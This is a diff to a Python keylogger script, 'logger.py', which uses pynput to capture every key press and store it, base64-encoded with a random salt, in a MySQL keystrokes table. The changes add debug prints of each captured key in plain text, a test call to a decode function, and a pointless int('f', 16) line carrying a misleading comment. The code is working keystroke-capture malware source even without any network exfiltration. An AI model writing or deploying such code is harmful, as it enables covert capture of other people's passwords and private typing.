@@ -1,13 +1,15 @@
+# logger.py
+
 import os
 import base64
 from mysql.connector import Error
 from pynput import keyboard
 from db_connector import connect_to_db
+from decoding_example import retrieve_and_decode_key  # Import the decode function
 
 def generate_salt(length=8):
     # Generate a random salt of the specified length
     return os.urandom(length)
-
 
 def log_key(key):
     connection = connect_to_db()
@@ -34,9 +36,19 @@ def log_key(key):
 
             # Insert the result into the database
             sql_query = "INSERT INTO keystrokes (key_pressed) VALUES (%s)"
-            print("Remove the word 'Key.'", result)
             cursor.execute(sql_query, (result,))
             connection.commit()
+
+            # Optional: Add debugging print statements if needed
+            int('f', 16)  # This will correctly convert 'f' to 15 in base-10
+
+            print(f"Original Key: {key_str}")
+            print(f"Salt: {salt.hex()}")
+            print(f"Encoded and salted result: {result}")
+
+            # Call the function to test decoding (for testing purposes)
+            retrieve_and_decode_key(result)
+
         except Error as e:
             print("Failed to insert data into MySQL table", e)
         finally:
@@ -49,4 +61,3 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.esc:
         return False  # Stop listener
-
